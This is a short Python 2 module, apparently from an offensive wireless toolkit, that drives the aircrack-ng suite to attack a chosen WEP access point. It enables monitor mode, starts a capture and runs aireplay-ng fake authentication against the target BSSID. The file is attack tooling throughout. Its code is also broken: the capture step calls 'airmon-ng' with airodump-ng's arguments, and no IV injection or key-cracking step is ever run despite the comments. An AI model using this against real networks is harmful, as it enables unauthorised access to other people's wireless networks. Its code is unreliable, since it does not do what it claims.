from signal import SIGINT
import util, stream
import sys, time

#
# Crack a WEP AP using the airmon-ng suite
#
class WEPCrack:
	def __init__(self):
		self.bssid = None
		self.mon_iface = None

	#
	# initialize the WEP cracker
	#
	def initialize(self):
		print '[+] Initializing AP scan.  (Cntrl+C) when you\'re ready to crack.'
		time.sleep(2)
		stream.initialize('ap_scan')
		try:
			self.bssid = raw_input('[!] BSSID: ')
			self.mon_iface = util.get_monitor_adapter()
			if self.mon_iface is None:
				print '[-] No adapter in monitor mode.  Enabling..'
				self.mon_iface = util.enable_monitor()
			tmp = raw_input('[!] Attempt to crack \'%s\' WEP key? '%self.bssid)
			if 'n' in tmp.lower():
				util.disable_monitor()
				return
			print '[!] Beginning WEP crack of BSSID \'%s\' on adapter \'%s\''%(self.bssid, self.mon_iface)
			self.crack()
		except Exception, j:
			print '[dbg] ', j
			return

	#
	# Crack the WEP key with IV injection. Technique adopted from:
	# http://www.aircrack-ng.org/doku.php?id=simple_wep_crack
	#
	def crack(self):
		print '[dbg] starting airodump-ng to capture IVs..'

		# start airodump to capture IV's
		airo_cmd = [ 'airmon-ng',
					 '-w', 'wep_zarp', 
					 '--bssid', self.bssid,
					 self.mon_iface ]
		airo_process = util.init_app(airo_cmd, False)
		
		# fake authentication
		airep_cmd = [ 'aireplay-ng', 
					  '-1', str('0'), 
					  '-a', self.bssid,
					  '-T', str('1'),
					  self.mon_iface ]
		airep_process = util.init_app(airep_cmd, False)

		print '[+] Faking authentication...'
		time.sleep(5)
		print '[+] Killing aireplay-ng...'
		util.kill_app(airep_process)
		
		print airep_process.communicate()[0]

		# cleanup
		if not util.kill_app(airo_process):
			print '[dbg] Error killing airmon-ng..'
		util.disable_monitor()
